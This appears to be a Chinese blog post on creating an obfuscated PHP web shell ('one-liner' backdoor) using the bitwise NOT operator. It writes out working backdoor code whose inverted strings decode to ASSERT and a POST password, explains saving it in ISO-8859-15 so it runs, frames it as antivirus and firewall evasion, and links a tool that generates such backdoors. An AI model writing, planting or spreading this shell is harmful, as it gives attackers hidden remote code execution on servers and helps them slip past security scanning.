---
layout: post
title: PHP中使用按位取反 (~) 函数创建后门
---
##### PHP ~ 位运算符

前一段时间老外在 twitter 上爆出个有趣的东西，一串疑似乱码的字符串访问后却能正常输出1337。

PHP: 位运算符 - [http://www.php.net/manual/zh/language.operators.bitwise.php](http://www.php.net/manual/zh/language.operators.bitwise.php)

    ~ $a        Not（按位取反）        将 $a 中为 0 的位设为 1，反之亦然。

PHP 的 ini 设定 error_reporting 使用了按位的值，提供了关闭某个位的真实例子。要显示除了提示级别之外的所有错误。

php.ini 中是这样用的： 

1. E_ALL & ~E_NOTICE 
2. 具体运作方式是先取得 E_ALL 的值： 00000000000000000111011111111111 
3. 再取得 E_NOTICE 的值： 00000000000000000000000000001000 
4. 然后通过 ~ 将其取反： 11111111111111111111111111110111 
5. 最后再用按位与 AND（&）得到两个值中都设定了（为 1）的位： 00000000000000000111011111110111

##### 分析并重现

这个就是当时最原始的代码实现效果：

<center><img src="http://ww3.sinaimg.cn/large/c334041bjw1eqyhz6jli3j208a05x74i.jpg"></center>

当看到这个效果的时候最先想到的就是绕过防火墙等后门的实现，之后开始考虑这是哪种编码方式？后来同李普君测试中发现直接使用echo ~'1';等则会直接输出以上的'乱码'。

<center><img src="http://ww2.sinaimg.cn/large/c334041bjw1eqyhzql66oj209l05pmxg.jpg"></center>

那么我们便可以开始写一句话试试效果了：

    <?php
    $x=~Ÿ¬¬º­«;
    $x($_POST[~¹¹ÏÏÏÏ]);
    ?>
    
<center><img src="http://ww3.sinaimg.cn/large/c334041bjw1eqyi09q1vmj20go07l0tu.jpg"></center>

这里定义$x变量为ASSERT，然后密码为FF0000直接链接后门便可，因为当位取反出来'乱码'后我们再取一次反即可返回正常值。

##### 关于编码与免杀

当重现这个后门的时候我发现，直接Copy过来的直接HTTP状态500，源头是编码问题，上面这种'乱码'其实为西欧（ISO-8859-15）。实际过程中我们遇到了多次后门无法链接出现500的错误均势因为编码问题，如果默认编码无法识别将编码方式保存为这种即可（GBK\UTF8\...均不能成功使用）

<center><img src="http://ww2.sinaimg.cn/large/c334041bjw1eqyi0vx9vtj20g408cn0d.jpg"></center>

##### 留在最后

我们写了一个小脚本为了方便生成：[http://www.hackersoul.com/tools/Createbackdoor-1.php](http://www.hackersoul.com/tools/Createbackdoor-1.php)

使用方法：Createbackdoor-1.php?pwd=password